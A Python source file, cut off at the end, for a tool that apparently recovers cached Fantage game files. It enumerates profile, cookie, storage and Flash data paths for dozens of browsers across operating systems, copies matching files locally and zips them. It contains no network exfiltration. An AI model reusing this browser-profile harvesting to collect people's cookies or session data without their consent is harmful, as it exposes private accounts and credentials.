import ctypes
import os
import platform
import re
import shutil
import subprocess
import threading
import uuid
import zipfile
from dataclasses import dataclass
from string import ascii_uppercase
from typing import Iterable, List, Optional, Sequence, Tuple

try:
    from scanner_utils import (
        classify_directory,
        has_browser_cache_marker,
        has_path_marker,
        is_contextual_candidate,
        is_browser_cache_related,
        is_opaque_cache_file,
        is_related,
    )
except ImportError:
    from src.scanner_utils import (
        classify_directory,
        has_browser_cache_marker,
        has_path_marker,
        is_contextual_candidate,
        is_browser_cache_related,
        is_opaque_cache_file,
        is_related,
    )


BROWSER_DISCOVERY_KEYWORDS = (
    "arc",
    "avast",
    "basilisk",
    "brave",
    "browser",
    "cent",
    "chrome",
    "chromium",
    "coccoc",
    "comodo",
    "dragon",
    "edge",
    "epic",
    "firefox",
    "floorp",
    "icedragon",
    "iridium",
    "kmelon",
    "librewolf",
    "maxthon",
    "mozilla",
    "navigator",
    "opera",
    "palemoon",
    "seamonkey",
    "sidekick",
    "slimjet",
    "thorium",
    "torch",
    "ucbrowser",
    "vivaldi",
    "waterfox",
    "whale",
    "yandex",
    "zen",
)

BROWSER_VENDOR_HINTS = {
    "apple computer",
    "avast software",
    "bravesoftware",
    "comodo",
    "google",
    "maxthon",
    "microsoft",
    "mozilla",
    "moonchild productions",
    "naver",
    "opera software",
    "the browser company",
    "vivaldi",
    "waterfox",
    "yandex",
}

PROFILE_HINT_NAMES = {
    "application support",
    "browser",
    "cache",
    "cache2",
    "inetcache",
    "local storage",
    "profile",
    "profiles",
    "session storage",
    "temporary internet files",
    "user data",
}

CHROMIUM_SCAN_DIRS = (
    "Cache",
    "Code Cache",
    "GPUCache",
    "Media Cache",
    "IndexedDB",
    "Local Storage",
    "Session Storage",
    "Service Worker",
    "Storage",
    "File System",
    "FileSystem",
    "databases",
    "Pepper Data",
    "blob_storage",
)

CHROMIUM_PROFILE_PREFIXES = (
    "profile ",
    "guest profile",
    "system profile",
)

FIREFOX_SCAN_DIRS = (
    "cache2",
    "OfflineCache",
    "storage",
    "sessionstore-backups",
)

FIREFOX_PROFILE_FILES = (
    "cookies.sqlite",
    "cookies.sqlite-shm",
    "cookies.sqlite-wal",
    "permissions.sqlite",
    "storage.sqlite",
    "webappsstore.sqlite",
    "webappsstore.sqlite-shm",
    "webappsstore.sqlite-wal",
)

GENERIC_CACHE_DIR_HINTS = {
    "#sharedobjects",
    "cache",
    "cache2",
    "indexeddb",
    "local storage",
    "offlinecache",
    "pepper data",
    "service worker",
    "session storage",
    "storage",
}

IGNORED_FILE_NAMES = {
    ".ds_store",
    "desktop.ini",
    "thumbs.db",
}

COMMON_MISC_EXCLUDED_DIRS = {
    "__pycache__",
    ".git",
    ".hg",
    ".svn",
    ".tox",
    ".venv",
    "build",
    "dist",
    "node_modules",
    "venv",
}

WINDOWS_MISC_EXCLUDED_DIRS = {
    "$recycle.bin",
    "appdata",
    "program files",
    "program files (x86)",
    "programdata",
    "windows",
}

DARWIN_MISC_EXCLUDED_DIRS = {
    ".trash",
    "library",
}

LINUX_MISC_EXCLUDED_DIRS = {
    ".cache",
    ".config",
    ".local",
    "dev",
    "proc",
    "run",
    "snap",
    "sys",
    "tmp",
}


@dataclass(frozen=True)
class ScanSource:
    label: str
    root: str
    output_parts: Tuple[str, ...]
    description: str
    max_depth: Optional[int] = None


class FantageExtractor:
    def __init__(self, output_dir, update_callback, search_path=None, keyword="fantage", username=""):
        self.output_dir = output_dir
        self.update_callback = update_callback
        self.search_path = search_path
        self.keyword = keyword
        self.username = username
        self.stop_event = threading.Event()
        self.files_found = 0
        self._copied_input_paths = set()

    @staticmethod
    def _discover_browser_roots(*base_dirs):
        found = []
        seen = set()

        def remember(path):
            normalized = os.path.normcase(os.path.abspath(path))
            if os.path.isdir(path) and normalized not in seen:
                seen.add(normalized)
                found.append(os.path.abspath(path))

        def scan(path, depth):
            if depth > 2 or not os.path.isdir(path):
                return

            try:
                entries = list(os.scandir(path))
            except OSError:
                return

            for entry in entries:
                if not entry.is_dir(follow_symlinks=False):
                    continue

                name = entry.name.lower()
                browser_like = any(keyword in name for keyword in BROWSER_DISCOVERY_KEYWORDS)
                profile_like = name in PROFILE_HINT_NAMES
                if browser_like or profile_like:
                    remember(entry.path)

                should_recurse = browser_like or name in BROWSER_VENDOR_HINTS
                if should_recurse:
                    scan(entry.path, depth + 1)

        for base_dir in base_dirs:
            scan(base_dir, 0)

        return found

    @staticmethod
    def _numbered_name(base_name, index):
        return base_name if index == 1 else f"{base_name}_{index}"

    @classmethod
    def _next_output_targets(cls, output_dir, folder_base_name, zip_base_name):
        index = 1
        while True:
            numbered_folder = cls._numbered_name(folder_base_name, index)
            numbered_zip = cls._numbered_name(zip_base_name, index)
            folder_path = os.path.join(output_dir, numbered_folder)
            zip_path = os.path.join(output_dir, f"{numbered_zip}.zip")
            if not os.path.exists(folder_path) and not os.path.exists(zip_path):
                return folder_path, zip_path
            index += 1

    @staticmethod
    def _sanitize_component(value):
        cleaned = re.sub(r'[\\/:*?"<>|]+', "_", value or "").strip()
        cleaned = re.sub(r"\s+", " ", cleaned)
        return cleaned or "Unknown"

    @staticmethod
    def _display_path(path, limit=72):
        if len(path) <= limit:
            return path
        return "..." + path[-(limit - 3):]

    @staticmethod
    def _safe_scandir(path):
        try:
            return list(os.scandir(path))
        except OSError:
            return []

    @staticmethod
    def _contains_any_dirs(root, names):
        return any(os.path.isdir(os.path.join(root, name)) for name in names)

    @staticmethod
    def _contains_any_files(root, names):
        return any(os.path.exists(os.path.join(root, name)) for name in names)

    @classmethod
    def _looks_like_chromium_profile(cls, path, name=None):
        profile_name = (name or os.path.basename(path)).lower()
        if profile_name == "default" or profile_name.startswith(CHROMIUM_PROFILE_PREFIXES):
            return True
        return cls._contains_any_dirs(path, CHROMIUM_SCAN_DIRS)

    @classmethod
    def _looks_like_firefox_profile(cls, path):
        return cls._contains_any_dirs(path, FIREFOX_SCAN_DIRS) or cls._contains_any_files(path, FIREFOX_PROFILE_FILES)

    @staticmethod
    def _normalize_label_for_inference(part):
        cleaned = part.replace("-", " ").replace("_", " ").strip()
        return re.sub(r"\s+", " ", cleaned)

    @classmethod
    def _infer_browser_label(cls, path):
        generic_names = PROFILE_HINT_NAMES | {"default"}
        parts = [part for part in os.path.normpath(path).split(os.sep) if part]
        for part in reversed(parts):
            lowered = part.lower()
            if lowered in generic_names:
                continue
            if any(keyword in lowered for keyword in BROWSER_DISCOVERY_KEYWORDS):
                return cls._sanitize_component(cls._normalize_label_for_inference(part).title())
        basename = os.path.basename(path.rstrip(os.sep))
        return cls._sanitize_component(cls._normalize_label_for_inference(basename).title())

    @staticmethod
    def _path_parts(*parts):
        return tuple(part for part in parts if part)

    def _add_source(self, sources, seen, label, root, output_parts, description, max_depth=None):
        if not os.path.isdir(root):
            return

        normalized_root = os.path.normcase(os.path.abspath(root))
        safe_parts = tuple(self._sanitize_component(part) for part in output_parts)
        key = (normalized_root, safe_parts, max_depth)
        if key in seen:
            return

        seen.add(key)
        sources.append(
            ScanSource(
                label=label,
                root=os.path.abspath(root),
                output_parts=safe_parts,
                description=description,
                max_depth=max_depth,
            )
        )

    def _add_direct_source(self, sources, seen, label, root, *suffix_parts):
        description = " / ".join(self._path_parts(label, *suffix_parts))
        output_parts = self._path_parts("browser_caches", label, *suffix_parts)
        self._add_source(sources, seen, label, root, output_parts, description)

    def _iter_chromium_profiles(self, install_root):
        seen = set()
        if self._looks_like_chromium_profile(install_root):
            seen.add(os.path.normcase(os.path.abspath(install_root)))
            yield install_root, os.path.basename(install_root)

        for entry in self._safe_scandir(install_root):
            if not entry.is_dir(follow_symlinks=False):
                continue
            if not self._looks_like_chromium_profile(entry.path, entry.name):
                continue
            normalized = os.path.normcase(os.path.abspath(entry.path))
            if normalized in seen:
                continue
            seen.add(normalized)
            yield entry.path, entry.name

    def _iter_firefox_profiles(self, install_root):
        seen = set()
        if self._looks_like_firefox_profile(install_root):
            seen.add(os.path.normcase(os.path.abspath(install_root)))
            yield install_root, os.path.basename(install_root)

        for entry in self._safe_scandir(install_root):
            if not entry.is_dir(follow_symlinks=False):
                continue
            if not self._looks_like_firefox_profile(entry.path):
                continue
            normalized = os.path.normcase(os.path.abspath(entry.path))
            if normalized in seen:
                continue
            seen.add(normalized)
            yield entry.path, entry.name

    def _add_chromium_profile_sources(self, sources, seen, browser_name, profile_root, profile_name=None):
        profile_name = profile_name or os.path.basename(profile_root)
        base_parts = self._path_parts("browser_caches", browser_name, profile_name)

        self._add_source(
            sources,
            seen,
            browser_name,
            profile_root,
            self._path_parts(*base_parts, "Profile Files"),
            " / ".join(self._path_parts(browser_name, profile_name, "Profile Files")),
            max_depth=0,
        )

        for directory in CHROMIUM_SCAN_DIRS:
            source_root = os.path.join(profile_root, directory)
            self._add_source(
                sources,
                seen,
                browser_name,
                source_root,
                self._path_parts(*base_parts, directory),
                " / ".join(self._path_parts(browser_name, profile_name, directory)),
            )

    def _add_firefox_profile_sources(self, sources, seen, browser_name, profile_root, profile_name=None, location_label=None):
        profile_name = profile_name or os.path.basename(profile_root)
        base_parts = list(self._path_parts("browser_caches", browser_name, profile_name))
        description_parts = list(self._path_parts(browser_name, profile_name))
        if location_label:
            base_parts.append(location_label)
            description_parts.append(location_label)

        self._add_source(
            sources,
            seen,
            browser_name,
            profile_root,
            self._path_parts(*base_parts, "Profile Files"),
            " / ".join(self._path_parts(*description_parts, "Profile Files")),
            max_depth=0,
        )

        for directory in FIREFOX_SCAN_DIRS:
            source_root = os.path.join(profile_root, directory)
            self._add_source(
                sources,
                seen,
                browser_name,
                source_root,
                self._path_parts(*base_parts, directory),
                " / ".join(self._path_parts(*description_parts, directory)),
            )

    def _add_chromium_install_sources(self, sources, seen, browser_name, install_root):
        for profile_root, profile_name in self._iter_chromium_profiles(install_root):
            self._add_chromium_profile_sources(sources, seen, browser_name, profile_root, profile_name)

    def _add_firefox_install_sources(self, sources, seen, browser_name, install_root, location_label=None):
        for profile_root, profile_name in self._iter_firefox_profiles(install_root):
            self._add_firefox_profile_sources(
                sources,
                seen,
                browser_name,
                profile_root,
                profile_name=profile_name,
                location_label=location_label,
            )

    def get_all_cache_sources(self):
        sources = []
        seen = set()
        system = platform.system()
        user_home = os.path.expanduser("~")

        def add_chromium_group(mapping):
            for label, roots in mapping.items():
                for root in roots:
                    self._add_chromium_install_sources(sources, seen, label, root)

        def add_firefox_group(mapping):
            for label, root_infos in mapping.items():
                for root, location_label in root_infos:
                    self._add_firefox_install_sources(sources, seen, label, root, location_label=location_label)

        if system == "Windows":
            local_appdata = os.environ.get("LOCALAPPDATA", os.path.join(user_home, "AppData", "Local"))
            local_low = os.path.join(user_home, "AppData", "LocalLow")
            roaming_appdata = os.environ.get("APPDATA", os.path.join(user_home, "AppData", "Roaming"))

            add_chromium_group(
                {
                    "Google Chrome": [os.path.join(local_appdata, "Google", "Chrome", "User Data")],
                    "Google Chrome Beta": [os.path.join(local_appdata, "Google", "Chrome Beta", "User Data")],
                    "Google Chrome Canary": [os.path.join(local_appdata, "Google", "Chrome SxS", "User Data")],
                    "Microsoft Edge": [os.path.join(local_appdata, "Microsoft", "Edge", "User Data")],
                    "Microsoft Edge Beta": [os.path.join(local_appdata, "Microsoft", "Edge Beta", "User Data")],
                    "Microsoft Edge Dev": [os.path.join(local_appdata, "Microsoft", "Edge Dev", "User Data")],
                    "Microsoft Edge Canary": [os.path.join(local_appdata, "Microsoft", "Edge SxS", "User Data")],
                    "Brave Browser": [os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data")],
                    "Vivaldi": [os.path.join(local_appdata, "Vivaldi", "User Data")],
                    "Chromium": [os.path.join(local_appdata, "Chromium", "User Data")],
                    "Yandex Browser": [os.path.join(local_appdata, "Yandex", "YandexBrowser", "User Data")],
                    "Arc": [os.path.join(local_appdata, "The Browser Company", "Arc", "User Data")],
                    "Sidekick": [os.path.join(local_appdata, "Sidekick", "User Data")],
                    "Thorium": [os.path.join(local_appdata, "Thorium", "User Data")],
                    "Naver Whale": [os.path.join(local_appdata, "Naver", "Naver Whale", "User Data")],
                    "Avast Secure Browser": [os.path.join(local_appdata, "Avast Software", "Browser", "User Data")],
                    "CCleaner Browser": [os.path.join(local_appdata, "CCleaner Browser", "User Data")],
                    "Cent Browser": [os.path.join(local_appdata, "CentBrowser", "User Data")],
                    "Comodo Dragon": [os.path.join(local_appdata, "Comodo", "Dragon", "User Data")],
                    "Torch": [os.path.join(local_appdata, "Torch", "User Data")],
                    "Slimjet": [os.path.join(local_appdata, "Slimjet", "User Data")],
                    "Epic Privacy Browser": [os.path.join(local_appdata, "Epic Privacy Browser", "User Data")],
                    "Coc Coc": [os.path.join(local_appdata, "CocCoc", "Browser", "User Data")],
                    "Iridium": [os.path.join(local_appdata, "Iridium", "User Data")],
                }
            )

            add_chromium_group(
                {
                    "Opera Stable": [os.path.join(roaming_appdata, "Opera Software", "Opera Stable")],
                    "Opera GX": [os.path.join(roaming_appdata, "Opera Software", "Opera GX Stable")],
                    "Opera Neon": [os.path.join(roaming_appdata, "Opera Software", "Opera Neon")],
                }
            )

            add_firefox_group(
                {
                    "Mozilla Firefox": [
                        (os.path.join(roaming_appdata, "Mozilla", "Firefox", "Profiles"), "Roaming"),
                        (os.path.join(local_appdata, "Mozilla", "Firefox", "Profiles"), "Local Cache"),
                    ],
                    "LibreWolf": [
                        (os.path.join(roaming_appdata, "LibreWolf", "Profiles"), "Roaming"),
                        (os.path.join(local_appdata, "LibreWolf", "Profiles"), "Local Cache"),
                    ],
                    "Floorp": [
                        (os.path.join(roaming_appdata, "Floorp", "Profiles"), "Roaming"),
                        (os.path.join(local_appdata, "Floorp", "Profiles"), "Local Cache"),
                    ],
                    "Zen": [
                        (os.path.join(roaming_appdata, "Zen", "Profiles"), "Roaming"),
                        (os.path.join(local_appdata, "Zen", "Profiles"), "Local Cache"),
                    ],
                    "Waterfox": [
                        (os.path.join(roaming_appdata, "Waterfox", "Profiles"), "Roaming"),
                        (os.path.join(local_appdata, "Waterfox", "Profiles"), "Local Cache"),
                    ],
                    "Pale Moon": [
                        (os.path.join(roaming_appdata, "Moonchild Productions", "Pale Moon", "Profiles"), "Roaming"),
                        (os.path.join(local_appdata, "Moonchild Productions", "Pale Moon", "Profiles"), "Local Cache"),
                    ],
                    "Basilisk": [
                        (os.path.join(roaming_appdata, "Moonchild Productions", "Basilisk", "Profiles"), "Roaming"),
                        (os.path.join(local_appdata, "Moonchild Productions", "Basilisk", "Profiles"), "Local Cache"),
                    ],
                    "SeaMonkey": [
                        (os.path.join(roaming_appdata, "Mozilla", "SeaMonkey", "Profiles"), "Roaming"),
                        (os.path.join(local_appdata, "Mozilla", "SeaMonkey", "Profiles"), "Local Cache"),
                    ],
                    "K-Meleon": [
                        (os.path.join(local_appdata, "K-Meleon"), None),
                    ],
                }
            )

            for label, root, suffix in (
                ("Internet Explorer", os.path.join(local_appdata, "Microsoft", "Windows", "INetCache"), "INetCache"),
                ("Internet Explorer", os.path.join(local_appdata, "Microsoft", "Windows", "Temporary Internet Files"), "Temporary Internet Files"),
                ("Legacy Safari", os.path.join(local_appdata, "Apple Computer", "Safari"), "Local"),
                ("Legacy Safari", os.path.join(roaming_appdata, "Apple Computer", "Safari"), "Roaming"),
                ("Macromedia Flash Player", os.path.join(roaming_appdata, "Macromedia", "Flash Player"), None),
                ("Adobe Flash Player", os.path.join(roaming_appdata, "Adobe", "Flash Player"), "Roaming"),
                ("Adobe Flash Player", os.path.join(local_appdata, "Adobe", "Flash Player"), "Local"),
                ("Shockwave Player", os.path.join(roaming_appdata, "Macromedia", "Shockwave Player"), "Roaming"),
                ("Shockwave Player", os.path.join(local_appdata, "Macromedia", "Shockwave Player"), "Local"),
                ("Flash LocalLow", os.path.join(local_low, "Macromedia"), None),
            ):
                self._add_direct_source(sources, seen, label, root, *(self._path_parts(suffix)))

            self._add_generic_discovered_sources(
                sources,
                seen,
                local_appdata,
                roaming_appdata,
                local_low,
            )

        elif system == "Darwin":
            library = os.path.join(user_home, "Library")
            app_support = os.path.join(library, "Application Support")
            caches = os.path.join(library, "Caches")
            preferences = os.path.join(library, "Preferences")

            add_chromium_group(
                {
                    "Google Chrome": [os.path.join(app_support, "Google", "Chrome")],
                    "Google Chrome Beta": [os.path.join(app_support, "Google", "Chrome Beta")],
                    "Google Chrome Canary": [os.path.join(app_support, "Google", "Chrome Canary")],
                    "Chromium": [os.path.join(app_support, "Chromium")],
                    "Brave Browser": [os.path.join(app_support, "BraveSoftware", "Brave-Browser")],
                    "Vivaldi": [os.path.join(app_support, "Vivaldi")],
                    "Microsoft Edge": [os.path.join(app_support, "Microsoft Edge")],
                    "Arc": [os.path.join(app_support, "The Browser Company", "Arc")],
                    "Yandex Browser": [os.path.join(app_support, "Yandex", "YandexBrowser")],
                    "Opera": [
                        os.path.join(app_support, "Opera Software", "Opera Stable"),
                        os.path.join(app_support, "com.operasoftware.Opera"),
                    ],
                }
            )

            add_firefox_group(
                {
                    "Mozilla Firefox": [
                        (os.path.join(app_support, "Firefox", "Profiles"), "Application Support"),
                        (os.path.join(caches, "Firefox", "Profiles"), "Caches"),
                    ],
                    "LibreWolf": [
                        (os.path.join(app_support, "LibreWolf", "Profiles"), "Application Support"),
                        (os.path.join(caches, "LibreWolf"), "Caches"),
                    ],
                    "Floorp": [
                        (os.path.join(app_support, "Floorp", "Profiles"), "Application Support"),
                        (os.path.join(caches, "Floorp"), "Caches"),
                    ],
                    "Zen": [
                        (os.path.join(app_support, "Zen", "Profiles"), "Application Support"),
                        (os.path.join(caches, "Zen"), "Caches"),
                    ],
                    "Waterfox": [
                        (os.path.join(app_support, "Waterfox", "Profiles"), "Application Support"),
                        (os.path.join(caches, "Waterfox"), "Caches"),
                    ],
                    "Pale Moon": [
                        (os.path.join(app_support, "Pale Moon", "Profiles"), "Application Support"),
                    ],
                    "Basilisk": [
                        (os.path.join(app_support, "Basilisk", "Profiles"), "Application Support"),
                    ],
                    "SeaMonkey": [
                        (os.path.join(app_support, "SeaMonkey", "Profiles"), "Application Support"),
                    ],
                }
            )

            for label, root, suffix in (
                ("Safari", os.path.join(caches, "com.apple.Safari"), "Caches"),
                ("Safari", os.path.join(library, "Safari"), "Data"),
                ("Macromedia Flash Player", os.path.join(preferences, "Macromedia", "Flash Player"), None),
                ("Adobe Flash Player", os.path.join(app_support, "Adobe", "Flash Player"), None),
                ("Macromedia", os.path.join(app_support, "Macromedia"), None),
            ):
                self._add_direct_source(sources, seen, label, root, *(self._path_parts(suffix)))

            self._add_generic_discovered_sources(
                sources,
                seen,
                app_support,
                caches,
            )

        else:
            cache_home = os.environ.get("XDG_CACHE_HOME", os.path.join(user_home, ".cache"))
            config_home = os.environ.get("XDG_CONFIG_HOME", os.path.join(user_home, ".config"))
            flatpak_app_root = os.path.join(user_home, ".var", "app")

            add_chromium_group(
                {
                    "Google Chrome": [os.path.join(config_home, "google-chrome")],
                    "Google Chrome Beta": [os.path.join(config_home, "google-chrome-beta")],
                    "Google Chrome Dev": [os.path.join(config_home, "google-chrome-unstable")],
                    "Chromium": [os.path.join(config_home, "chromium")],
                    "Brave Browser": [os.path.join(config_home, "BraveSoftware", "Brave-Browser")],
                    "Vivaldi": [os.path.join(config_home, "vivaldi")],
                    "Microsoft Edge": [os.path.join(config_home, "microsoft-edge")],
                    "Microsoft Edge Beta": [os.path.join(config_home, "microsoft-edge-beta")],
                    "Microsoft Edge Dev": [os.path.join(config_home, "microsoft-edge-dev")],
                    "Yandex Browser": [os.path.join(config_home, "yandex-browser")],
                    "Opera": [os.path.join(config_home, "opera")],
                    "Thorium": [os.path.join(config_home, "thorium")],
                }
            )

            add_firefox_group(
                {
                    "Mozilla Firefox": [
                        (os.path.join(user_home, ".mozilla", "firefox"), None),
                    ],
                    "LibreWolf": [
                        (os.path.join(user_home, ".librewolf"), None),
                    ],
                    "Floorp": [
                        (os.path.join(user_home, ".floorp"), None),
                    ],
                    "Zen": [
                        (os.path.join(user_home, ".zen"), None),
                    ],
                    "Waterfox": [
                        (os.path.join(config_home, "waterfox"), None),
                    ],
                    "Pale Moon": [
                        (os.path.join(user_home, ".moonchild productions", "pale moon"), None),
                    ],
                    "Basilisk": [
                        (os.path.join(user_home, ".moonchild productions", "basilisk"), None),
                    ],
                    "SeaMonkey": [
                        (os.path.join(user_home, ".mozilla", "seamonkey"), None),
                    ],
                }
            )

            for label, root, suffix in (
                ("Macromedia Flash Player", os.path.join(user_home, ".macromedia", "Flash_Player"), None),
                ("Adobe Flash Player", os.path.join(user_home, ".adobe", "Flash_Player"), None),
            ):
                self._add_direct_source(sources, seen, label, root, *(self._path_parts(suffix)))

            self._add_generic_discovered_sources(
                sources,
                seen,
                config_home,
                cache_home,
                flatpak_app_root,
            )

        return sources

    def _add_generic_discovered_sources(self, sources, seen, *base_dirs):
        for root in self._discover_browser_roots(*base_dirs):
            label = self._infer_browser_label(root)
            basename = os.path.basename(root).lower()
            if basename == "user data":
                self._add_chromium_install_sources(sources, seen, label, root)
            elif basename in {"profiles", "profile"}:
                self._add_firefox_install_sources(sources, seen, label, root)
            elif self._looks_like_chromium_profile(root):
                self._add_chromium_profile_sources(sources, seen, label, root, os.path.basename(root))
            elif self._looks_like_firefox_profile(root):
                self._add_firefox_profile_sources(sources, seen, label, root, os.path.basename(root))
            elif self._contains_any_dirs(root, {name for name in GENERIC_CACHE_DIR_HINTS}):
                self._add_direct_source(sources, seen, label, root, os.path.basename(root))

    def _windows_removable_roots(self):
        roots = []
        try:
            mask = ctypes.windll.kernel32.GetLogicalDrives()
            get_drive_type = ctypes.windll.kernel32.GetDriveTypeW
        except Exception:
            return roots

        system_drive = os.environ.get("SystemDrive", "C:").upper()
        for index, letter in enumerate(ascii_uppercase):
            if not (mask & (1 << index)):
                continue
            drive_root = f"{letter}:\\"
            drive_type = get_drive_type(drive_root)
            if letter == system_drive.rstrip(":"):
                continue
            if drive_type == 2 and os.path.isdir(drive_root):
                roots.append((f"Drive {letter}", drive_root))
        return roots

    def get_misc_sources(self, browser_sources):
        if self.search_path:
            return []

        system = platform.system()
        user_home = os.path.expanduser("~")
        seen = set()
        misc_sources = []

        def add_misc_source(label, root):
            if not os.path.isdir(root):
                return
            normalized = os.path.normcase(os.path.abspath(root))
            if normalized in seen:
                return
            seen.add(normalized)
            misc_sources.append(
                ScanSource(
                    label=label,
                    root=os.path.abspath(root),
                    output_parts=self._path_parts("misc", label),
                    description=f"Misc / {label}",
                )
            )

        add_misc_source("Home", user_home)

        if system == "Windows":
            for label, root in self._windows_removable_roots():
                add_misc_source(label, root)
        elif system == "Darwin":
            for entry in self._safe_scandir("/Volumes"):
                if entry.is_dir(follow_symlinks=False):
                    add_misc_source(f"Volumes {entry.name}", entry.path)
        else:
            roots = ["/mnt", "/media", os.path.join("/run", "media", os.path.basename(user_home))]
            for base_root in roots:
                for entry in self._safe_scandir(base_root):
                    if entry.is_dir(follow_symlinks=False):
                        add_misc_source(f"{os.path.basename(base_root) or base_root} {entry.name}", entry.path)

        return misc_sources

    def run(self):
        try:
            self.files_found = 0
            self._copied_input_paths = set()

            safe_name = re.sub(r"[^\w\-. ]", "", self.username or "").strip()
            folder_name = f"Fantage_Extraction_{safe_name}" if safe_name else "Fantage_Extraction"
            zip_name = f"Fantage_Cache_{safe_name}" if safe_name else "Fantage_Cache_Extracted"
            extract_base, zip_path = self._next_output_targets(self.output_dir, folder_name, zip_name)
            os.makedirs(extract_base, exist_ok=True)

            if self.search_path:
                browser_sources = [
                    ScanSource(
                        label="Selected Path",
                        root=os.path.abspath(self.search_path),
                        output_parts=self._path_parts(
                            "selected_path",
                            os.path.basename(os.path.abspath(self.search_path)) or "root",
                        ),
                        description=f"Selected Path / {self._display_path(self.search_path)}",
                    )
                ]
                misc_sources = []
            else:
                self.update_callback("Locating browser caches and Flash data...", 0)
                browser_sources = self.get_all_cache_sources()
                misc_sources = self.get_misc_sources(browser_sources)

            total_items = len(browser_sources) + len(misc_sources)
            if total_items == 0:
                self.update_callback("No browser or search locations were found.", 100)
                return

            excluded_misc_roots = [os.path.abspath(source.root) for source in browser_sources]
            stopped = False

            for index, source in enumerate(browser_sources, start=1):
                if self.stop_event.is_set():
                    stopped = True
                    break
                self.update_callback(
                    f"Scanning browser source: {source.description}",
                    int(((index - 1) / total_items) * 85),
                )
                self._scan_browser_source(source, extract_base)

            if not stopped:
                start_index = len(browser_sources) + 1
                for offset, source in enumerate(misc_sources, start=start_index):
                    if self.stop_event.is_set():
                        stopped = True
                        break
                    self.update_callback(
                        f"Scanning misc source: {source.description}",
                        int(((offset - 1) / total_items) * 85),
                    )
                    self._scan_misc_source(source, extract_base, excluded_misc_roots)

            if self.files_found > 0:
                self.update_callback("Zipping files...", 92)
                self._make_zip(extract_base, zip_path)
                status = "Stopped early — partial results zipped." if stopped else "Done!"
                self.update_callback(status, 100)
                self._open_folder(self.output_dir)
            else:
                if stopped:
                    self.update_callback("Stopped. No files found before cancellation.", 100)
                else:
                    self.update_callback("Done. No Fantage files found.", 100)

        except Exception as e:
            self.update_callback(f"Error: {e}", 0)
            print(f"Error details: {e}")

    def _scan_browser_source(self, source, extract_base):
        destination_root = self._destination_root(extract_base, source.output_parts)

        for root, dirs, files in os.walk(source.root, onerror=self._walk_error):
            if self.stop_event.is_set():
                return

            rel_root = os.path.relpath(root, source.root)
            depth = 0 if rel_root == "." else rel_root.count(os.sep) + 1
            visible_dirs = list(dirs)
            if source.max_depth is not None and depth >= source.max_depth:
                visible_dirs = []
                dirs[:] = []

            root_has_marker = has_browser_cache_marker(root)
            copy_mode = classify_directory(root, visible_dirs, files, self.keyword)
            if copy_mode == "all" and root_has_marker:
                self._copy_directory(root, destination_root, source.root)
                dirs[:] = []
                continue

            for file_name in files:
                full_path = os.path.join(root, file_name)
                if self._should_skip_file(full_path):
                    continue
                if is_browser_cache_related(full_path):
                    self._copy_file(full_path, destination_root, source.root)

    def _scan_misc_source(self, source, extract_base, excluded_roots):
        destination_root = self._destination_root(extract_base, source.output_parts)
        excluded_names = self._misc_excluded_names()

        for root, dirs, files in os.walk(source.root, onerror=self._walk_error):
            if self.stop_event.is_set():
                return

            self._prune_misc_dirs(root, dirs, excluded_roots, excluded_names)

            copy_mode = classify_directory(root, dirs, files, self.keyword)
            if copy_mode == "all":
                self._copy_directory(root, destination_root, source.root)
                dirs[:] = []
                continue

            for file_name in files:
                full_path = os.path.join(root, file_name)
                if self._should_skip_file(full_path):
                    continue
                if has_path_marker(full_path, self.keyword):
                    self._copy_file(full_path, destination_root, source.root)
                elif copy_mode == "files" and is_contextual_candidate(full_path):
                    self._copy_file(full_path, destination_root, source.root)
                elif copy_mode == "files" and is_opaque_cache_file(full_path) and is_related(full_path, self.keyword):
                    self._copy_file(full_path, destination_root, source.root)

    def _misc_excluded_names(self):
        system = platform.system()
        excluded = set(COMMON_MISC_EXCLUDED_DIRS)
        if system == "Windows":
            excluded.update(WINDOWS_MISC_EXCLUDED_DIRS)
        elif system == "Darwin":
            excluded.update(DARWIN_MISC_EXCLUDED_DIRS)
        else:
            excluded.update(LINUX_MISC_EXCLUDED_DIRS)
        return excluded

    @staticmethod
    def _is_same_or_child(path, possible_ancestor):
        try:
            return os.path.commonpath([os.path.abspath(path), os.path.abspath(possible_ancestor)]) == os.path.abspath(possible_ancestor)
        except ValueError:
            return False

    @staticmethod
    def _is_same_or_ancestor(path, possible_child):
        try:
            return os.path.commonpath([os.path.abspath(path), os.path.abspath(possible_child)]) == os.path.abspath(path)
        except ValueError:
            return False

    def _prune_misc_dirs(self, root, dirs, excluded_roots, excluded_names):
        kept = []
        for name in dirs:
            lowered = name.lower()
            child_path = os.path.join(root, name)
            if lowered in excluded_names:
                continue
            if any(self._is_same_or_ancestor(child_path, scan_root) or self._is_same_or_child(child_path, scan_root) for scan_root in excluded_roots):
                continue
            kept.append(name)
        dirs[:] = kept

    def _destination_root(self, extract_base, output_parts):
        return os.path.join(extract_base, *output_parts)

    @staticmethod
    def _should_skip_file(path):
        return os.path.basename(path).lower() in IGNORED_FILE_NAMES

    def _copy_directory(self, source_dir, dest_root, scan_root):
        try:
            copied_any = False
            for root, _, files in os.walk(source_dir):
                for file_name in files:
                    source_path = os.path.join(root, file_name)
                    if self._should_skip_file(source_path):
                        continue
                    if self._copy_file(source_path, dest_root, scan_root):
                        copied_any = True

            if copied_any:
                self.update_callback(f"Found folder: {os.path.basename(source_dir)}", 0)

        except Exception as e:
            print(f"Failed to copy dir {source_dir}: {e}")

    def _copy_file(self, source, dest_root, scan_root):
        try:
            source_key = os.path.normcase(os.path.abspath(source))
            if source_key in self._copied_input_paths:
                return False

            rel_path = os.path.relpath(source, scan_root)
            dest_path = os.path.join(dest_root, rel_path)
            if os.path.exists(dest_path):
                base, ext = os.path.splitext(dest_path)
                dest_path = f"{base}_{uuid.uuid4().hex[:4]}{ext}"

            os.makedirs(os.path.dirname(dest_path), exist_ok=True)
            shutil.copy2(source, dest_path)
            self._copied_input_paths.add(source_key)
            self.files_found += 1
            if self.files_found % 10 == 0:
                self.update_callback(f"Found {self.files_found} files...", 0)
            return True

        except Exception as e:
            print(f"Failed to copy {source}: {e}")
            return False

    def _make_zip(self, source_dir, zip_path):
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(source_dir):
                for file_name in files:
                    file_path = os.path.join(root, file_name)
                    arcname = os.path.relpath(file_path, source_dir)
                    zipf.write(file_path, arcname)

    @staticmethod
    def _rm_readonly(func, path, _excinfo):
        import stat

        os.chmod(path, stat.S_IWRITE)
        func(path)

    @staticmethod
    def _walk_error(_error):
        pass

    def _open_folder(self, path):
        try:
            if platform.system() == "Windows":
                os.startfile(path)
